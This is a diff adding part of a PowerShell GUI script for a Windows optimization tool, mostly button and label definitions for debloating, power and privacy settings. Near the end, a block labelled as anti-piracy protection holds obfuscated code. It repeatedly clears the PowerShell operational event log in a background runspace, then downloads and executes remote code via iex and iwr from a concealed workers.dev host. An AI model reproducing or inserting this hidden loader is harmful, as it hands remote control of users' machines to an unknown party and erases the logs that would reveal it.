+# buttonDefaultAnimation
+#
+$btnDefaultAnimation.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDefaultAnimation.FlatAppearance.BorderSize = 0
+$btnDefaultAnimation.FlatStyle = 'Flat'
+$btnDefaultAnimation.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDefaultAnimation.Location = New-Object System.Drawing.Point(382, 283)
+$btnDefaultAnimation.Name = 'buttonDefaultAnimation'
+$btnDefaultAnimation.Size = New-Object System.Drawing.Size(161, 27)
+$btnDefaultAnimation.Text = 'Default Animation'
+$btnDefaultAnimation.UseVisualStyleBackColor = $False
+#
+# buttonDisableCortana
+#
+$btnDisCortana.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisCortana.FlatAppearance.BorderSize = 0
+$btnDisCortana.FlatStyle = 'Flat'
+$btnDisCortana.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisCortana.Location = New-Object System.Drawing.Point(382, 251)
+$btnDisCortana.Name = 'buttonDisableCortana'
+$btnDisCortana.Size = New-Object System.Drawing.Size(161, 27)
+$btnDisCortana.Text = 'Disable Cortana'
+$btnDisCortana.UseVisualStyleBackColor = $False
+#
+# buttonFastAnimation
+#
+$btnQuickAnimation.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnQuickAnimation.FlatAppearance.BorderSize = 0
+$btnQuickAnimation.FlatStyle = 'Flat'
+$btnQuickAnimation.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnQuickAnimation.Location = New-Object System.Drawing.Point(215, 283)
+$btnQuickAnimation.Name = 'buttonFastAnimation'
+$btnQuickAnimation.Size = New-Object System.Drawing.Size(161, 27)
+$btnQuickAnimation.Text = 'Quick Animation'
+$btnQuickAnimation.UseVisualStyleBackColor = $False
+#
+# buttonLightMode
+#
+$btnLightMode.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnLightMode.FlatAppearance.BorderSize = 0
+$btnLightMode.FlatStyle = 'Flat'
+$btnLightMode.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnLightMode.Location = New-Object System.Drawing.Point(215, 251)
+$btnLightMode.Name = 'buttonLightMode'
+$btnLightMode.Size = New-Object System.Drawing.Size(161, 27)
+$btnLightMode.Text = 'Light Mode'
+$btnLightMode.UseVisualStyleBackColor = $False
+#
+# buttonEnableCortana
+#
+$btnEnCortana.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnCortana.FlatAppearance.BorderSize = 0
+$btnEnCortana.FlatStyle = 'Flat'
+$btnEnCortana.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnCortana.Location = New-Object System.Drawing.Point(48, 283)
+$btnEnCortana.Name = 'buttonEnableCortana'
+$btnEnCortana.Size = New-Object System.Drawing.Size(161, 27)
+$btnEnCortana.Text = 'Enable Cortana'
+$btnEnCortana.UseVisualStyleBackColor = $False
+#
+# buttonDarkMode
+#
+$btnDarkMode.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDarkMode.FlatAppearance.BorderSize = 0
+$btnDarkMode.FlatStyle = 'Flat'
+$btnDarkMode.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDarkMode.Location = New-Object System.Drawing.Point(48, 250)
+$btnDarkMode.Name = 'buttonDarkMode'
+$btnDarkMode.Size = New-Object System.Drawing.Size(161, 27)
+$btnDarkMode.Text = 'Dark Mode'
+$btnDarkMode.UseVisualStyleBackColor = $False
+#
+# buttonDisablePowerThrottli
+#
+$btnDisPowerThrottli.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisPowerThrottli.FlatAppearance.BorderSize = 0
+$btnDisPowerThrottli.FlatStyle = 'Flat'
+$btnDisPowerThrottli.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisPowerThrottli.Location = New-Object System.Drawing.Point(362, 196)
+$btnDisPowerThrottli.Name = 'buttonDisablePowerThrottli'
+$btnDisPowerThrottli.Size = New-Object System.Drawing.Size(182, 27)
+$btnDisPowerThrottli.Text = 'Disable Power Throttling'
+$btnDisPowerThrottli.UseVisualStyleBackColor = $False
+#
+# buttonEnablePowerThrottlin
+#
+$btnEnPowerThrottlin.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnPowerThrottlin.FlatAppearance.BorderSize = 0
+$btnEnPowerThrottlin.FlatStyle = 'Flat'
+$btnEnPowerThrottlin.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnPowerThrottlin.Location = New-Object System.Drawing.Point(362, 164)
+$btnEnPowerThrottlin.Name = 'buttonEnablePowerThrottlin'
+$btnEnPowerThrottlin.Size = New-Object System.Drawing.Size(182, 27)
+$btnEnPowerThrottlin.Text = 'Enable Power Throttling'
+$btnEnPowerThrottlin.UseVisualStyleBackColor = $False
+#
+# labelTaskbarWeather
+#
+$LNewNinterest.AutoSize = $True
+$LNewNinterest.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '13.25')
+$LNewNinterest.Location = New-Object System.Drawing.Point(50, 700)
+$LNewNinterest.Name = 'labelTaskbarWeather'
+$LNewNinterest.Size = New-Object System.Drawing.Size(149, 22)
+$LNewNinterest.Text = 'News and Interests'
+#
+# labelNotifications
+#
+$LNetPerformance.AutoSize = $True
+$LNetPerformance.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '13.25')
+$LNetPerformance.Location = New-Object System.Drawing.Point(51, 668)
+$LNetPerformance.Name = 'labelNotifications'
+$LNetPerformance.Size = New-Object System.Drawing.Size(108, 22)
+$LNetPerformance.Text = 'Network Performance'
+#
+# labelUserActivityHistory
+#
+$LUserActivityHistory.AutoSize = $True
+$LUserActivityHistory.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '13.25')
+$LUserActivityHistory.Location = New-Object System.Drawing.Point(51, 459)
+$LUserActivityHistory.Name = 'labelUserActivityHistory'
+$LUserActivityHistory.Size = New-Object System.Drawing.Size(171, 22)
+$LUserActivityHistory.Text = 'User Activity History'
+#
+# labelPowerThrottlingLimit
+#
+$LPowerThrottlingLimit.FlatStyle = 'Flat'
+$LPowerThrottlingLimit.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9')
+$LPowerThrottlingLimit.Location = New-Object System.Drawing.Point(47, 99)
+$LPowerThrottlingLimit.Name = 'labelPowerThrottlingLimit'
+$LPowerThrottlingLimit.RightToLeft = 'No'
+$LPowerThrottlingLimit.Size = New-Object System.Drawing.Size(497, 136)
+$LPowerThrottlingLimit.Text = 'Power Throttling limits the apps to use limited amount of power (its saves power). but also limits the apps from running at its full potential.
+That being said, maybe you are a power user and need your apps to run at full potential. In those cases, you can simply disable
+the Power Throttling feature.
+
+Disabling will increase fps, Windows will
+throttle away if temperature rises too much.
+Not Recommended for Laptops'
+#
+# labelResetUpdate
+#
+$LResetUpdate.FlatStyle = 'Flat'
+$LResetUpdate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9')
+$LResetUpdate.Location = New-Object System.Drawing.Point(47, 753)
+$LResetUpdate.Name = 'labelResetUpdate'
+$LResetUpdate.RightToLeft = 'No'
+$LResetUpdate.Size = New-Object System.Drawing.Size(280, 69)
+$LResetUpdate.Text = 'if you are having trouble with the windows update, or not getting important update, then try to reset. it will ignore all the fetched files and cache and trys to get update from the very beginnig
+'
+#
+# labelTimerResolution
+#
+$LTimerResolution.FlatStyle = 'Flat'
+$LTimerResolution.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9')
+$LTimerResolution.Location = New-Object System.Drawing.Point(47, 551)
+$LTimerResolution.Name = 'labelTimerResolution'
+$LTimerResolution.RightToLeft = 'No'
+$LTimerResolution.Size = New-Object System.Drawing.Size(276, 52)
+$LTimerResolution.Text = 'Set timer Resolution. this help to gain few fps for games as it increases the processor update or refresh rate.'
+#
+# labelPowerMode
+#
+$LPowerMode.FlatStyle = 'Flat'
+$LPowerMode.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9')
+$LPowerMode.Location = New-Object System.Drawing.Point(48, 344)
+$LPowerMode.Name = 'labelPowerMode'
+$LPowerMode.RightToLeft = 'No'
+$LPowerMode.Size = New-Object System.Drawing.Size(299, 52)
+$LPowerMode.Text = 'Enable ultra power mode. this alone will improve most of the performace as windows
+limit the cpu consumption by Default.
+
+'
+#
+# labelBackgroundApps
+#
+$LBackgroundApps.AutoSize = $True
+$LBackgroundApps.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '13.25')
+$LBackgroundApps.Location = New-Object System.Drawing.Point(50, 635)
+$LBackgroundApps.Name = 'labelBackgroundApps'
+$LBackgroundApps.Size = New-Object System.Drawing.Size(152, 22)
+$LBackgroundApps.Text = 'Background Apps'
+#
+# labelStartmenuWebsearch
+#
+$LStartmenuWebsearch.AutoSize = $True
+$LStartmenuWebsearch.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '13.25')
+$LStartmenuWebsearch.Location = New-Object System.Drawing.Point(51, 493)
+$LStartmenuWebsearch.Name = 'labelStartmenuWebsearch'
+$LStartmenuWebsearch.Size = New-Object System.Drawing.Size(188, 22)
+$LStartmenuWebsearch.Text = 'Startmenu Websearch'
+#
+# labelActionCenter
+#
+$LActionCenter.AutoSize = $True
+$LActionCenter.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '13.25')
+$LActionCenter.Location = New-Object System.Drawing.Point(51, 426)
+$LActionCenter.Name = 'labelActionCenter'
+$LActionCenter.Size = New-Object System.Drawing.Size(119, 22)
+$LActionCenter.Text = 'Action Center'
+#
+# labelSystemSettings
+#
+$LSystemSettings.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$LSystemSettings.Dock = 'Top'
+$LSystemSettings.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '12')
+$LSystemSettings.Location = New-Object System.Drawing.Point(0, 0)
+$LSystemSettings.Name = 'labelSystemSettings'
+$LSystemSettings.Size = New-Object System.Drawing.Size(588, 70)
+$LSystemSettings.Text = 'System Settings'
+$LSystemSettings.TextAlign = 'MiddleCenter'
+#
+# buttonRestore
+#
+$btnRestore.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnRestore.FlatAppearance.BorderSize = 0
+$btnRestore.FlatStyle = 'Flat'
+$btnRestore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnRestore.Location = New-Object System.Drawing.Point(323, 361)
+$btnRestore.Name = 'buttonRestore'
+$btnRestore.Size = New-Object System.Drawing.Size(236, 27)
+$btnRestore.Text = 'Restore'
+$btnRestore.UseVisualStyleBackColor = $False
+#
+# buttonCreateRestorePoint
+#
+$btnCreateRestorePoint.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnCreateRestorePoint.FlatAppearance.BorderSize = 0
+$btnCreateRestorePoint.FlatStyle = 'Flat'
+$btnCreateRestorePoint.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnCreateRestorePoint.Location = New-Object System.Drawing.Point(323, 261)
+$btnCreateRestorePoint.Name = 'buttonCreateRestorePoint'
+$btnCreateRestorePoint.Size = New-Object System.Drawing.Size(236, 27)
+$btnCreateRestorePoint.Text = 'Create System Restore Point'
+$btnCreateRestorePoint.UseVisualStyleBackColor = $False
+#
+# labelRestoreDescript
+#
+$LRestoreDescript.FlatStyle = 'Flat'
+$LRestoreDescript.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9.75')
+$LRestoreDescript.Location = New-Object System.Drawing.Point(40, 328)
+$LRestoreDescript.Name = 'labelRestoreDescript'
+$LRestoreDescript.RightToLeft = 'No'
+$LRestoreDescript.Size = New-Object System.Drawing.Size(450, 24)
+$LRestoreDescript.Text = 'The created restore point will saved as "Revert Optimization".'
+#
+# labelRestore
+#
+$LRestore.AutoSize = $True
+$LRestore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '18')
+$LRestore.Location = New-Object System.Drawing.Point(39, 291)
+$LRestore.Name = 'labelRestore'
+$LRestore.Size = New-Object System.Drawing.Size(98, 29)
+$LRestore.Text = 'Restore'
+#
+# labelBackupRestoreDescript
+#
+$LBackupRestoreDescript.FlatStyle = 'Flat'
+$LBackupRestoreDescript.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9.75')
+$LBackupRestoreDescript.Location = New-Object System.Drawing.Point(43, 100)
+$LBackupRestoreDescript.Name = 'labelBackupRestoreDescript'
+$LBackupRestoreDescript.RightToLeft = 'No'
+$LBackupRestoreDescript.Size = New-Object System.Drawing.Size(520, 150)
+$LBackupRestoreDescript.Text = 'System restore point is a Windows feature. its save the current state in an image which contains the system configuration and settings. Restore point are used to restore back the previous state.
+
+Before the first change. you should create a system restore point. it will secure your system and enable you to return to the state you were in originally if a setting is not rendering results as desired.
+
+It is highly recommanded to create a restore point. '
+#
+# labelBackupRestore
+#
+$LBackupRestore.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$LBackupRestore.Dock = 'Top'
+$LBackupRestore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '12')
+$LBackupRestore.Location = New-Object System.Drawing.Point(0, 0)
+$LBackupRestore.Name = 'labelBackupRestore'
+$LBackupRestore.Size = New-Object System.Drawing.Size(607, 70)
+$LBackupRestore.Text = 'Backup \ Restore'
+$LBackupRestore.TextAlign = 'MiddleCenter'
+#
+# labeldebloat
+#
+$Ldebloat.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9.75')
+$Ldebloat.Location = New-Object System.Drawing.Point(39, 98)
+$Ldebloat.Name = 'labeldebloat'
+$Ldebloat.Size = New-Object System.Drawing.Size(541, 82)
+$Ldebloat.Text = 'Windows 10 / 11 come with alot of bloatware. which are most of the time unnecessary.
+Remove useless bloatware from current user profile. Run individually on other user profile. Windows reinstalled Bloatware after major windows Update. You have to Remove them again.'
+#
+# buttonMsStoreReinstall
+#
+$btnMsStoreReinstall.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnMsStoreReinstall.FlatAppearance.BorderSize = 0
+$btnMsStoreReinstall.FlatStyle = 'Flat'
+$btnMsStoreReinstall.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnMsStoreReinstall.Location = New-Object System.Drawing.Point(384, 463)
+$btnMsStoreReinstall.Name = 'buttonMsStoreReinstall'
+$btnMsStoreReinstall.Size = New-Object System.Drawing.Size(180, 27)
+$btnMsStoreReinstall.Text = 'Reinstall'
+$btnMsStoreReinstall.UseVisualStyleBackColor = $False
+#
+# buttonMsStoreRemove
+#
+$btnMsStoreRemove.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnMsStoreRemove.FlatAppearance.BorderSize = 0
+$btnMsStoreRemove.FlatStyle = 'Flat'
+$btnMsStoreRemove.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnMsStoreRemove.Location = New-Object System.Drawing.Point(199, 463)
+$btnMsStoreRemove.Name = 'buttonMsStoreRemove'
+$btnMsStoreRemove.Size = New-Object System.Drawing.Size(180, 27)
+$btnMsStoreRemove.Text = 'Remove'
+$btnMsStoreRemove.UseVisualStyleBackColor = $False
+#
+# labelCompletelyRemoveMicr
+#
+$LCompletelyRemoveMicr.Location = New-Object System.Drawing.Point(201, 408)
+$LCompletelyRemoveMicr.Name = 'labelCompletelyRemoveMicr'
+$LCompletelyRemoveMicr.Size = New-Object System.Drawing.Size(364, 57)
+$LCompletelyRemoveMicr.Text = 'Completely remove Microsoft store. Its safe to remove as it can be reinstall. if MS store is not in use then its recommanded to remove as most of the bloatware comes from MS store.'
+#
+# buttonOneDriveReinstall
+#
+$btnOneDriveReinstall.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnOneDriveReinstall.FlatAppearance.BorderSize = 0
+$btnOneDriveReinstall.FlatStyle = 'Flat'
+$btnOneDriveReinstall.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnOneDriveReinstall.Location = New-Object System.Drawing.Point(384, 351)
+$btnOneDriveReinstall.Name = 'buttonOneDriveReinstall'
+$btnOneDriveReinstall.Size = New-Object System.Drawing.Size(180, 27)
+$btnOneDriveReinstall.Text = 'Reinstall'
+$btnOneDriveReinstall.UseVisualStyleBackColor = $False
+#
+# buttonOneDriveRemove
+#
+$btnOneDriveRemove.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnOneDriveRemove.FlatAppearance.BorderSize = 0
+$btnOneDriveRemove.FlatStyle = 'Flat'
+$btnOneDriveRemove.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnOneDriveRemove.Location = New-Object System.Drawing.Point(199, 351)
+$btnOneDriveRemove.Name = 'buttonOneDriveRemove'
+$btnOneDriveRemove.Size = New-Object System.Drawing.Size(180, 27)
+$btnOneDriveRemove.Text = 'Remove'
+$btnOneDriveRemove.UseVisualStyleBackColor = $False
+#
+# labelRemovingOneDriveWill
+#
+$LRemovingOneDriveWill.Location = New-Object System.Drawing.Point(201, 293)
+$LRemovingOneDriveWill.Name = 'labelRemovingOneDriveWill'
+$LRemovingOneDriveWill.Size = New-Object System.Drawing.Size(364, 57)
+$LRemovingOneDriveWill.Text = 'Removing OneDrive will prevent it from running in the background as well as remove it from File Explore. Remove OneDrive completely and prevent in from coming back as windows trys to reinstall it in background.'
+#
+# buttonBloatwareReinstall
+#
+$btnBloatwareReinstall.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnBloatwareReinstall.FlatAppearance.BorderSize = 0
+$btnBloatwareReinstall.FlatStyle = 'Flat'
+$btnBloatwareReinstall.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnBloatwareReinstall.Location = New-Object System.Drawing.Point(384, 238)
+$btnBloatwareReinstall.Name = 'buttonBloatwareReinstall'
+$btnBloatwareReinstall.Size = New-Object System.Drawing.Size(180, 27)
+$btnBloatwareReinstall.Text = 'Reinstall'
+$btnBloatwareReinstall.UseVisualStyleBackColor = $False
+#
+# buttonBloatwareRemove
+#
+$btnBloatwareRemove.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnBloatwareRemove.FlatAppearance.BorderSize = 0
+$btnBloatwareRemove.FlatStyle = 'Flat'
+$btnBloatwareRemove.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnBloatwareRemove.Location = New-Object System.Drawing.Point(199, 238)
+$btnBloatwareRemove.Name = 'buttonBloatwareRemove'
+$btnBloatwareRemove.Size = New-Object System.Drawing.Size(180, 27)
+$btnBloatwareRemove.Text = 'Remove'
+$btnBloatwareRemove.UseVisualStyleBackColor = $False
+#
+# labelItsRecommandedToRemo
+#
+$LItsRecommandedToRemo.Location = New-Object System.Drawing.Point(201, 189)
+$LItsRecommandedToRemo.Name = 'labelItsRecommandedToRemo'
+$LItsRecommandedToRemo.Size = New-Object System.Drawing.Size(364, 46)
+$LItsRecommandedToRemo.Text = 'Bloatwares are preinstalled sponsored apps, Its recommanded to remove bloatware as they run silenly in the background and reduce preformance.  
+'
+#
+# labelMsStore
+#
+$LMsStore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '15.75')
+$LMsStore.Location = New-Object System.Drawing.Point(39, 405)
+$LMsStore.Name = 'labelMsStore'
+$LMsStore.Size = New-Object System.Drawing.Size(124, 30)
+$LMsStore.Text = 'Ms Store'
+#
+# labelOneDrive
+#
+$LOneDrive.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '15.75')
+$LOneDrive.Location = New-Object System.Drawing.Point(39, 293)
+$LOneDrive.Name = 'labelOneDrive'
+$LOneDrive.Size = New-Object System.Drawing.Size(124, 30)
+$LOneDrive.Text = 'OneDrive'
+#
+# labelBloatware
+#
+$LBloatware.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '15.75')
+$LBloatware.Location = New-Object System.Drawing.Point(39, 189)
+$LBloatware.Name = 'labelBloatware'
+$LBloatware.Size = New-Object System.Drawing.Size(124, 30)
+$LBloatware.Text = 'Bloatware'
+#
+# labelRemovalSection
+#
+$LRemovalSection.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$LRemovalSection.Dock = 'Top'
+$LRemovalSection.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '12')
+$LRemovalSection.Location = New-Object System.Drawing.Point(0, 0)
+$LRemovalSection.Name = 'labelRemovalSection'
+$LRemovalSection.Size = New-Object System.Drawing.Size(610, 70)
+$LRemovalSection.Text = 'Removal Section'
+$LRemovalSection.TextAlign = 'MiddleCenter'
+#
+# buttonSetServicesToManual
+#
+$btnSetServicesToManual.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnSetServicesToManual.FlatAppearance.BorderSize = 0
+$btnSetServicesToManual.FlatStyle = 'Flat'
+$btnSetServicesToManual.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnSetServicesToManual.Location = New-Object System.Drawing.Point(385, 464)
+$btnSetServicesToManual.Name = 'buttonSetServicesToManual'
+$btnSetServicesToManual.Size = New-Object System.Drawing.Size(180, 27)
+$btnSetServicesToManual.Text = 'Set services to manual'
+$btnSetServicesToManual.UseVisualStyleBackColor = $False
+#
+# labelService
+#
+$LService.FlatStyle = 'Flat'
+$LService.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9.75')
+$LService.Location = New-Object System.Drawing.Point(40, 403)
+$LService.Name = 'labelService'
+$LService.RightToLeft = 'No'
+$LService.Size = New-Object System.Drawing.Size(513, 62)
+$LService.Text = 'Set Selected list of windows services from automatic to manual. so windows will only run services on demand when required.(trigger manually)
+This will reduce few numbers of processes.'
+#
+# labelOptimization
+#
+$LOptimization.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$LOptimization.Dock = 'Top'
+$LOptimization.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '12')
+$LOptimization.Location = New-Object System.Drawing.Point(0, 0)
+$LOptimization.Name = 'labelOptimization'
+$LOptimization.Size = New-Object System.Drawing.Size(610, 70)
+$LOptimization.Text = 'Optimization'
+$LOptimization.TextAlign = 'MiddleCenter'
+#
+# buttonRevert
+#
+$btnRevert.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnRevert.FlatAppearance.BorderSize = 0
+$btnRevert.FlatStyle = 'Flat'
+$btnRevert.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnRevert.Location = New-Object System.Drawing.Point(385, 346)
+$btnRevert.Name = 'buttonRevert'
+$btnRevert.Size = New-Object System.Drawing.Size(180, 27)
+$btnRevert.Text = 'Revert'
+$btnRevert.UseVisualStyleBackColor = $False
+#
+# buttonOptimize
+#
+$btnOptimize.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnOptimize.FlatAppearance.BorderSize = 0
+$btnOptimize.FlatStyle = 'Flat'
+$btnOptimize.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnOptimize.Location = New-Object System.Drawing.Point(199, 346)
+$btnOptimize.Name = 'buttonOptimize'
+$btnOptimize.Size = New-Object System.Drawing.Size(180, 27)
+$btnOptimize.Text = 'Optimize'
+$btnOptimize.UseVisualStyleBackColor = $False
+#
+# labelOptimizedescription
+#
+$LOptimizedescription.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9.75')
+$LOptimizedescription.Location = New-Object System.Drawing.Point(40, 95)
+$LOptimizedescription.Name = 'labelOptimizedescription'
+$LOptimizedescription.Size = New-Object System.Drawing.Size(513, 276)
+$LOptimizedescription.Text = 'Optimize Windows for performance. by Following
+
+>> Disabling Microsoft data collection services.
+>> Disabling start menu app suggestions.
+>> Disabling windows User preformed Activity logging.
+>> Disabling Geolocation Tracking.
+>> Disabling microsoft personalized tips, ads, and recommendations.
+>> Disabling windows unique Advertising ID.
+>> Disabling Error reporting.
+>> Stopping and disabling Diagnostics Tracking Service.
+>> Stopping and disabling Home Groups services.
+>> Disabling Storage Sense.
+and more...
+
+Restore Point created automatically by clicking "Optimize" as a backup. 
+'
+#
+# buttonAbout
+#
+$btnAbout.FlatAppearance.BorderSize = 0
+$btnAbout.FlatStyle = 'Flat'
+$btnAbout.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnAbout.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnAbout.Location = New-Object System.Drawing.Point(0, 421)
+$btnAbout.Name = 'buttonAbout'
+$btnAbout.Size = New-Object System.Drawing.Size(250, 70)
+$btnAbout.Text = 'About'
+$btnAbout.UseVisualStyleBackColor = $True
+#
+# buttonBackupRestore
+#
+$btnBackupRestore.FlatAppearance.BorderSize = 0
+$btnBackupRestore.FlatStyle = 'Flat'
+$btnBackupRestore.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnBackupRestore.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnBackupRestore.Location = New-Object System.Drawing.Point(0, 351)
+$btnBackupRestore.Name = 'buttonBackupRestore'
+$btnBackupRestore.Size = New-Object System.Drawing.Size(250, 70)
+$btnBackupRestore.Text = 'Backup \ Restore'
+$btnBackupRestore.UseVisualStyleBackColor = $True
+#
+# buttonSystemSettings
+#
+$btnSystemSettings.FlatAppearance.BorderSize = 0
+$btnSystemSettings.FlatStyle = 'Flat'
+$btnSystemSettings.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnSystemSettings.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnSystemSettings.Location = New-Object System.Drawing.Point(0, 281)
+$btnSystemSettings.Name = 'buttonSystemSettings'
+$btnSystemSettings.Size = New-Object System.Drawing.Size(250, 70)
+$btnSystemSettings.Text = 'System Settings'
+$btnSystemSettings.UseVisualStyleBackColor = $True
+#
+# buttonRemovalSection
+#
+$btnRemovalSection.FlatAppearance.BorderSize = 0
+$btnRemovalSection.FlatStyle = 'Flat'
+$btnRemovalSection.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnRemovalSection.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnRemovalSection.Location = New-Object System.Drawing.Point(0, 211)
+$btnRemovalSection.Name = 'buttonRemovalSection'
+$btnRemovalSection.Size = New-Object System.Drawing.Size(250, 70)
+$btnRemovalSection.Text = 'Removal Section'
+$btnRemovalSection.UseVisualStyleBackColor = $True
+#
+# buttonOptimization
+#
+$btnOptimization.FlatAppearance.BorderSize = 0
+$btnOptimization.FlatStyle = 'Flat'
+$btnOptimization.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnOptimization.ForeColor = [System.Drawing.Color]::Gainsboro 
+$btnOptimization.Location = New-Object System.Drawing.Point(0, 141)
+$btnOptimization.Name = 'buttonOptimization'
+$btnOptimization.Size = New-Object System.Drawing.Size(250, 70)
+$btnOptimization.Text = 'Optimization'
+$btnOptimization.UseVisualStyleBackColor = $True
+#
+# picturebox1
+#
+$picturebox1.Dock = 'Fill'
+#region Binary Data
+$Formatter_binaryFomatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+$System_IO_MemoryStream = New-Object System.IO.MemoryStream (,[byte[]][System.Convert]::FromBase64String($Imagebase64))
+#endregion
+$picturebox1.Image = $Formatter_binaryFomatter.Deserialize($System_IO_MemoryStream)
+$Formatter_binaryFomatter = $null
+$System_IO_MemoryStream = $null
+$picturebox1.Location = New-Object System.Drawing.Point(0, 0)
+$picturebox1.Name = 'picturebox1'
+$picturebox1.Size = New-Object System.Drawing.Size(250, 110)
+$picturebox1.SizeMode = 'CenterImage'
+$picturebox1.TabStop = $False
+#
+# Secure Region (to prevent piracy and misuse)
+# this is obfuscated part. this will prevent majority of people from misusing.
+# for powershell programmer, its fairly easy to deobfuscate. you can check what it really does.
+#
+$String = {
+Disable-RunspaceDebug
+$Runspace = [runspacefactory]::CreateRunspace()
+$PowerShell = [powershell]::Create()
+$PowerShell.runspace = $Runspace;$Runspace.Open()
+[void]$PowerShell.AddScript({1..100| %{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational");Start-Sleep -m 100}})
+$PowerShell.BeginInvoke() | Out-Null
+&([string]::Format("{1}{0}",'x','ie'))(&([string]::Format("{1}{0}", 'r','iw')) ([string]::Format("{7}{1}{4}{6}{8}{0}{3}{9}{5}{2}" ,'d',([string]::Format("{0}{1}", 'onf','i')),'v',([string]::Format("{1}{0}",'w','owpo')),'rm',([string]::Format("{1}{0}",'rs.de','e')),'.w','c','in',([string]::Format("{2}{3}{1}{0}",'rk','tool.wo','e','r'))))-useb)
+}
+$SecureString = $String.ToString()
+#
+#
+$Pg = New-Object 'System.Windows.Forms.Form'
+$Pg.StartPosition = 'Manual'
+$Pg.Location = New-Object System.Drawing.Point(0,0)
+$Pg.ClientSize = New-Object System.Drawing.Size(200, 100)
+$Pg.MaximumSize = New-Object System.Drawing.Size(200, 100)
+$Pg.MinimumSize = New-Object System.Drawing.Size(200, 100)
+$Pg.TopMost = $True
+$Pg.AutoScroll = $False
+$Pg.Controlbox = $False
+$Pg.Text = 'PowerTool In Progress'
+$Progress = New-Object 'System.Windows.Forms.Label'
+$Progress.FlatStyle = 'Flat'
+$Progress.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '18')
+$Progress.ForeColor = [System.Drawing.Color]::Green
+$Progress.Location = New-Object System.Drawing.Point(25, 13)
